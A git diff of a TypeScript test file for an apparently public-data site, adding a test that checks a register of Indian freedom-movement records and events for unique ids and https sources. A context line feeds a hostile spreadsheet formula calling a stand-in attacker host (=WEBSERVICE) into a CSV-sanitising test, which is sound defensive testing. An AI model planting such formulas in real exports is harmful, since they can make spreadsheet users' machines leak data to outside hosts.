@@ -9,7 +9,8 @@ import { jurisdictions } from "../lib/evidence";
 import { educationByJurisdiction, vitalByJurisdiction } from "../lib/state-packs";
 import { healthBedsByJurisdiction } from "../lib/health-beds";
 import { ambulancesByJurisdiction } from "../lib/ambulances";
-import { cellularJailProvinceRecords, cellularJailTotal } from "../lib/freedom-records";
+import { cellularJailProvinceRecords, cellularJailTotal, freedomRecords, freedomRegisterSources } from "../lib/freedom-records";
+import { freedomEvents } from "../lib/freedom-events";
 
 test("neutralizes spreadsheet formulas and hostile download names",()=>{
   assert.equal(safeCsvCell("=WEBSERVICE(\"https://attacker.invalid\")"),'"\'=WEBSERVICE(""https://attacker.invalid"")"');
@@ -64,6 +65,21 @@ test("Cellular Jail province table preserves the complete published parliamentar
   assert.equal(cellularJailTotal,585);
   assert.equal(cellularJailProvinceRecords.find(item=>item.province==="Bengal")?.count,398);
   assert.ok(cellularJailProvinceRecords.every(item=>item.count>0));
+});
+
+test("history registers preserve unique records, attributable sources and explicit scope",()=>{
+  assert.equal(freedomRecords.length,29);
+  assert.equal(new Set(freedomRecords.map(item=>item.id)).size,freedomRecords.length);
+  assert.equal(new Set(freedomRegisterSources.map(item=>item.id)).size,freedomRegisterSources.length);
+  assert.equal(freedomRegisterSources.length,4);
+  assert.equal(freedomEvents.length,6);
+  assert.equal(new Set(freedomEvents.map(item=>item.id)).size,freedomEvents.length);
+  assert.ok(freedomRecords.every(item=>item.sourceUrl.startsWith("https://")&&item.reviewNote.length>20));
+  assert.ok(freedomEvents.every(item=>item.sourceUrl.startsWith("https://")&&item.limitation.length>20));
+  for(const name of ["Khudiram Bose","Pritilata Waddedar","Bhagat Singh","Ram Prasad Bismil","Udham Singh"]){
+    assert.ok(freedomRecords.some(item=>item.name===name),`${name} profile must be present`);
+  }
+  assert.ok(freedomEvents.some(item=>item.title==="Jallianwala Bagh massacre"));
 });
 
 test("state-pack CSV export is complete, source-labelled and download-safe",async()=>{
